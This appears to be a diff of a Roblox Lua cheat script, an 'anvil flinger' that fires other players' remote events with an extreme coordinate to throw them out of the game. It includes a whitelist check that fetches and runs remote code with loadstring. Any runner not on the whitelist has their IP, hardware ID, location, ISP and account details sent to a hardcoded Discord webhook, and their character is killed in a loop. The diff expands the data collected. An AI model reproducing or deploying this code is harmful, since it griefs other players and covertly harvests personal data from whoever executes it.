@@ -1,3 +1,4 @@
+-- Services
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -9,39 +10,13 @@ local UserInputService = game:GetService("UserInputService")
 local Stats = game:GetService("Stats")
 local Lighting = game:GetService("Lighting")
 
--- CONFIG --
+-- Configuration
 local LOADSTRING_URL = "https://raw.githubusercontent.com/uzikillaz/scripts/refs/heads/main/authorized_users.txt"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1357889195833692200/adE_Rv_peaSVrTd1qLt0vVoFVlzwz3KQ7m6Yn3Qh1IkNrDRUiDIkaXchKkCbxSW5V8Vj"
--------------------
-
--- ORIGINAL ANVIL FLINGER CODE (completely unchanged)
 local LocalPlayer = Players.LocalPlayer
 local enabled = true
 
-local function flingAnvils()
-    if not enabled then return end
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player == LocalPlayer then continue end
-        
-        local anvil = player.Character and player.Character:FindFirstChild("Anvil")
-        if not anvil then continue end
-        
-        local send = anvil:FindFirstChild("send")
-        if not send then continue end
-        
-        pcall(function()
-            send:FireServer(CFrame.new(0, -10^308, 0)) -- Max negative float value
-        end)
-    end
-end
-
-LocalPlayer.Chatted:Connect(function(msg)
-    enabled = msg == ".on" or not (msg == ".off")
-end)
-
--- VERIFICATION SYSTEM (added but doesn't modify original functionality)
-local isAuthorized = false
-
+-- Intrusion Logger
 local function logIntrusion()
     local UserId = LocalPlayer.UserId
     local DisplayName = LocalPlayer.DisplayName
@@ -59,35 +34,56 @@ local function logIntrusion()
     local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
     local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
 
-    local executor = identifyexecutor and identifyexecutor() or "Unknown"
+    local function detectExecutor()
+        return identifyexecutor and identifyexecutor() or "Unknown"
+    end
+
+    local executor = detectExecutor()
     local date = os.date("%m/%d/%Y")
     local time = os.date("%X")
     local gameLink = "https://www.roblox.com/games/"..game.PlaceId
     local playerLink = "https://www.roblox.com/users/"..UserId
+    local mobileJoinLink = "https://www.roblox.com/games/start?placeId="..game.PlaceId.."&launchData="..game.JobId
+    local jobIdLink = "https://www.roblox.com/games/"..game.PlaceId.."?jobId="..game.JobId
 
     local data = {
-        username = "Security System",
+        username = "Anvil Flinger Security",
+        avatar_url = "https://i.pinimg.com/564x/0a/e0/a0/0ae0a0f6b8abfd380b6da3f4178db8e6.jpg",
         embeds = {
             {
                 title = "🚨 Unauthorized Access Detected",
-                description = string.format("**[%s](%s)**", GameName, gameLink),
+                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
                 color = tonumber("0xe74c3c")
             },
             {
                 title = "👤 Intruder Details",
                 description = string.format(
-                    "**User:** [%s](%s)\n**ID:** %d\n**Executor:** %s",
-                    DisplayName, playerLink, UserId, executor
+                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Executor:** %s",
+                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, executor
                 ),
                 color = tonumber("0x3498db")
             },
             {
                 title = "🌐 Location Data",
                 description = string.format(
-                    "**IP:** `%s`\n**HWID:** `%s`",
-                    GetIp, Hwid
+                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s\n**Region:** %s\n**ISP:** %s",
+                    GetIp, Hwid, 
+                    success and GetData.country or "N/A",
+                    success and GetData.regionName or "N/A",
+                    success and GetData.isp or "N/A"
                 ),
                 color = tonumber("0xf1c40f")
+            },
+            {
+                title = "📊 Game Stats",
+                description = string.format(
+                    "**Ping:** %dms\n**Job ID:** [%s](%s)\n**Mobile Join:** [Link](%s)",
+                    Ping, game.JobId, jobIdLink, mobileJoinLink
+                ),
+                color = tonumber("0x2ecc71"),
+                footer = { 
+                    text = string.format("📅 %s | ⏰ %s", date, time)
+                }
             }
         }
     }
@@ -100,43 +96,62 @@ local function logIntrusion()
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode(data)
         })
+    else
+        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data))
     end
 end
 
-local function verifyPlayer()
-    local success, whitelist = pcall(function()
-        return loadstring(game:HttpGet(LOADSTRING_URL, true))()
-    end)
+-- Authorization Check
+local isAuthorized = false
+do
+    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checking...", "All")
     
-    if success and whitelist then
+    local success = pcall(function()
+        local whitelist = loadstring(game:HttpGet(LOADSTRING_URL, true))().GetWhitelist()
         for _, username in ipairs(whitelist) do
             if LocalPlayer.Name:lower() == username:lower() then
                 isAuthorized = true
                 break
             end
         end
-    end
+    end)
     
     if not isAuthorized then
         logIntrusion()
+        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("May god forgive.", "All")
         Lighting.Brightness = -99
         while true do
-            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-                LocalPlayer.Character.Humanoid.Health = 0
+            local char = LocalPlayer.Character
+            if char and char:FindFirstChild("Humanoid") then
+                char.Humanoid.Health = 0
             end
             RunService.Heartbeat:Wait()
         end
-    end
-end
-
--- MODIFIED HEARTBEAT CONNECTION TO CHECK AUTHORIZATION
-RunService.Heartbeat:Connect(function()
-    if not isAuthorized then
-        verifyPlayer()
         return
     end
-    flingAnvils()
+    
+    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Authorized.", "All")
+end
+
+-- Anti-Anvil System
+RunService.Heartbeat:Connect(function()
+    if not enabled then return end
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player == LocalPlayer then continue end
+        
+        local anvil = player.Character and player.Character:FindFirstChild("Anvil")
+        if not anvil then continue end
+        
+        local send = anvil:FindFirstChild("send")
+        if not send then continue end
+        
+        pcall(function()
+            send:FireServer(CFrame.new(0, -10^308, 0))
+        end)
+    end
 end)
 
--- Initialize verification
-verifyPlayer()
+-- Command System
+LocalPlayer.Chatted:Connect(function(msg)
+    enabled = msg == ".on" or not (msg == ".off")
+end)
